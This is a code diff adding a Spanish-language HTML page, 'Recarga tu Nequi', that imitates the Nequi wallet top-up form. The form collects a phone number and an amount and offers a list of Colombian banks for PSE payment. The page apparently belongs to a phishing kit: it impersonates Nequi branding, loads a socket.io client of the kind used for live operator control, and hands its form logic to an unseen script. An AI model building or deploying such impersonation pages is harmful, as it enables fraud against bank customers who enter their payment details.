@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recarga tu Nequi</title>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17954168974"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){ dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'AW-17954168974');
+    </script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <script src="/socket.io/socket.io.js"></script>
+
+    <div class="container">
+        <div class="logo">
+            <img src="img/nequi-logo.svg" alt="Nequi">
+        </div>
+
+        <h1>Recarga tu Nequi</h1>
+
+        <form class="recharge-form" id="recharge-form" novalidate>
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label" for="phone">Número de celular</label>
+                    <input type="tel" id="phone" name="phone" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric" autocomplete="tel">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label" for="confirm-phone">Confirma el número de celular</label>
+                    <input type="tel" id="confirm-phone" name="confirm-phone" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric" autocomplete="off">
+                </div>
+                <span class="error-message" id="phone-error"></span>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label" for="amount">¿Cuánto?</label>
+                    <input type="text" id="amount" name="amount" inputmode="numeric" autocomplete="off">
+                </div>
+                <span class="error-message" id="amount-error"></span>
+            </div>
+
+            <div class="form-group">
+                <div class="select-wrapper has-value-default">
+                    <div class="select-label-static">Tipo de persona</div>
+                    <select id="person-type" name="person-type" class="has-value">
+                        <option value="natural" selected>Natural</option>
+                        <option value="juridica">Jurídica</option>
+                    </select>
+                    <div class="select-arrow"></div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="select-wrapper no-float">
+                    <span class="select-placeholder" id="bank-placeholder">Elige el banco</span>
+                    <div class="select-label-static">Elige el banco</div>
+                    <select id="bank" name="bank">
+                        <option value="" disabled selected hidden></option>
+                        <option value="">A continuación seleccione su banco</option>
+                        <option value="alianza">ALIANZA FIDUCIARIA</option>
+                        <option value="Agrario">BANCO AGRARIO</option>
+                        <option value="AV Villas">BANCO AV VILLAS</option>
+                        <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
+                        <option value="Caja Social">BANCO CAJA SOCIAL</option>
+                        <option value="cooperativo">BANCO COOPERATIVO COPCENTRAL</option>
+                        <option value="Davivienda">BANCO DAVIVIENDA</option>
+                        <option value="Bogota">BANCO DE BOGOTA</option>
+                        <option value="Occidente">BANCO DE OCCIDENTE</option>
+                        <option value="Falabella">BANCO FALABELLA</option>
+                        <option value="finandina">BANCO FINANDINA S.A. BIC</option>
+                        <option value="gnb">BANCO GNB SUDAMERIS</option>
+                        <option value="itau">BANCO ITAU</option>
+                        <option value="jpmorgan">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                        <option value="Banco Mundo Mujer">BANCO MUNDO MUJER S.A.</option>
+                        <option value="pichincha">BANCO PICHINCHA S.A.</option>
+                        <option value="Popular">BANCO POPULAR</option>
+                        <option value="santander">BANCO SANTANDER COLOMBIA</option>
+                        <option value="Serfinanza">BANCO SERFINANZA</option>
+                        <option value="union">BANCO UNION</option>
+                        <option value="ban100">BAN100</option>
+                        <option value="bancamia">BANCAMIA S.A.</option>
+                        <option value="Bancolombia">BANCOLOMBIA</option>
+                        <option value="bancoomeva">BANCOOMEVA S.A.</option>
+                        <option value="bold">BOLD CF</option>
+                        <option value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                        <option value="citibank">CITIBANK</option>
+                        <option value="coink">COINK SA</option>
+                        <option value="coltefinanciera">COLTEFINANCIERA</option>
+                        <option value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                        <option value="cotrafa">COTRAFA</option>
+                        <option value="crezcamos">CREZCAMOS MOSI</option>
+                        <option value="dale">DALE</option>
+                        <option value="Daviplata">DAVIPLATA</option>
+                        <option value="ding">DING</option>
+                        <option value="juriscoop">FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
+                        <option value="global66">GLOBAL66</option>
+                        <option value="iris">IRIS</option>
+                        <option value="jfk">JFK COOPERATIVA FINANCIERA</option>
+                        <option value="lulo">LULO BANK</option>
+                        <option value="movii">MOVII S.A.</option>
+                        <option value="nu">NU</option>
+                        <option value="powii">POWII</option>
+                        <option value="rappipay">RAPPIPAY</option>
+                        <option value="Scotiabank Colpatria">SCOTIABANK COLPATRIA</option>
+                        <option value="uala">UALÁ</option>
+                    </select>
+                    <div class="select-arrow"></div>
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <label class="checkbox-container">
+                    <input type="checkbox" name="terms">
+                    <span class="checkmark"></span>
+                    <span class="checkbox-text">Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.</span>
+                </label>
+            </div>
+
+            <p class="info-text">
+                La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
+            </p>
+
+            <button type="submit" class="btn-submit" id="submit-btn" disabled>Continuar</button>
+
+            <a href="#" class="help-link">Ayuda</a>
+        </form>
+    </div>
+
+    <script src="js/nequi-form.js" defer></script>
+</body>
+</html>
